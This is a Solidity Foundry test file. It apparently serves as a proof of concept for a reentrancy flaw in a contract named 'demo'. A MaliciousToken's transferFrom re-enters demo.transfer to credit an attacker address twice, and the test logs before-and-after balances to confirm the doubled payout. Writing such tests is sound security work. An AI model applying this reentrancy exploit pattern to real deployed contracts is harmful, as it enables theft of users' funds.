// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol";

contract MaliciousToken {
    address public demoAddress;
    address public userAddress;
    address public attackerAddress;
    bool public reentrancyTriggered = false;

    constructor() {
    }

    function setAddresses(address _demo, address _user, address _attacker) external {
        demoAddress = _demo;
        userAddress = _user;
        attackerAddress = _attacker;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        if (!reentrancyTriggered) {
            reentrancyTriggered = true;
            
            address[] memory _tos = new address[](1);
            _tos[0] = attackerAddress;
            
            uint[] memory v = new uint[](1);
            v[0] = 100;

            (bool success, ) = demoAddress.call(
                abi.encodeWithSignature(
                    "transfer(address,address,address[],uint256[])",
                    userAddress,
                    address(this),
                    _tos,
                    v
                )
            );
            require(success, "Reentrant call failed");
        }
        return true;
    }
}

contract ReentrancyTest is Test {
    demo public d;
    MaliciousToken public token;
    address constant user = address(0x1);
    address constant attacker = address(0x2);

    function setUp() public {
        d = new demo();
        token = new MaliciousToken();
        token.setAddresses(address(d), user, attacker);
        d.approveToken(address(token));
    }

    function testReentrancyVulnerability() public {
        // BEFORE state snapshot
        uint attackerBalanceBefore = d.getUserBalance(attacker);
        uint totalTransfersBefore = d.totalTransfers();
        
        console2.log("--- BEFORE State Snapshot ---");
        console2.log("Attacker balance:", attackerBalanceBefore);
        console2.log("Total transfers:", totalTransfersBefore);
        console2.log("---------------------------------");

        console2.log("--- Trigger Attack: transfer ---");
        vm.startPrank(user);
        address[] memory receivers = new address[](1);
        receivers[0] = attacker;
        uint[] memory amounts = new uint[](1);
        amounts[0] = 100;
        d.transfer(user, address(token), receivers, amounts);
        vm.stopPrank();
        console2.log("---------------------------------");

        // AFTER state snapshot
        uint attackerBalanceAfter = d.getUserBalance(attacker);
        uint totalTransfersAfter = d.totalTransfers();
        
        console2.log("--- AFTER State Snapshot ---");
        console2.log("Attacker balance:", attackerBalanceAfter);
        console2.log("Total transfers:", totalTransfersAfter);
        console2.log("---------------------------------");

        // Differential changes
        uint256 balanceDiff = attackerBalanceAfter - attackerBalanceBefore;
        uint256 transfersDiff = totalTransfersAfter - totalTransfersBefore;
        bool reentrancyTriggered = token.reentrancyTriggered();

        console2.log("--- Differential Results ---");
        console2.log("Balance difference:", balanceDiff);
        console2.log("Transfers difference:", transfersDiff);
        console2.log("ReentrancyTriggered:", reentrancyTriggered ? "true" : "false");
        console2.log("---------------------------------");

        // Final vulnerability verdict
        if (balanceDiff == 200 && reentrancyTriggered) {
            console2.log("Vulnerability Exists: Reentrancy doubled attacker balance (200 delta) with extra transfer");
        } else {
            console2.log("Vulnerability not Exist: Expected state changes not detected (balance delta %d, reentrancy %s)", 
                         balanceDiff, 
                         reentrancyTriggered ? "triggered" : "not triggered");
        }
    }
}